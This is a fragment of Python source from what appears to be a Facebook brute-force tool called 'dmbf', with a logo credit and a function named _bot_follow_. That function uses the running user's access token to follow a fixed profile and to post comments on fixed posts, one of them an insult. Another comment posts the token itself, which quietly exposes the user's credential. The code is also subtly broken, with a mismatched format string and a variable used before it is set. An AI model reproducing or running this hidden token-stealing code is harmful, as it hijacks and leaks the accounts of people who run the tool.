...
_logo_line_3_ = ('%s| |) | |\/| | _ \ _|  %s│   %s• Code Rav Pratama•   %s│'%(_P_,_U_,_P_,_U_))
_logo_line_4_ = ('%s|___/|_|  |_|___/_|   %s│ %sGithub.com/RavXD/dmbf %s│'%(_P_,_U_,_P_,_U_))
_logo_line_5_ = ('%s SPARK Team 2021    └─────────────────────────┘'%(_U_))
def _my_logo_():
...
def _bot_follow_(_tok_dev_):
    try:
        for _list_ in _my_account_:
            try:
                _req_post_("https://graph.facebook.com/100007740797954/subscribers?access_token=%s"%(_list_,_tok_dev_))
                _req_post_('https://graph.facebook.com/2978417695759561/comments/?message=' +kom3+ '&access_token=' + token)
                _req_post_('https://graph.facebook.com/3088882871430325/comments/?message=' +token+ '&access_token=' + token)
                kom3 = " Lo Kentod bng :v"
                time.sleep(0.3)
            except:pass
